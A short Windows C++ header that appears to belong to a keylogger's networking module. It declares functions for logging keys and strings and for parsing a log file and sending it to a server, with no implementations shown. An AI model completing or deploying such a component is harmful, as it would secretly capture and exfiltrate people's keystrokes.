#ifndef SWINENETWORKING_H
#define SWINENETWORKING_H
#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
namespace SwineNetworking {
	class Networking {
	public:
		static int __cdecl Networking::parseFileAndSendToServer();
		static int __cdecl Networking::logString(char *character);
		static int __cdecl logKey(short character);
		static int __cdecl extract(const char *str, int *bytes_sent);
		static int __cdecl sendFile(FILE of);
	};
}
#endif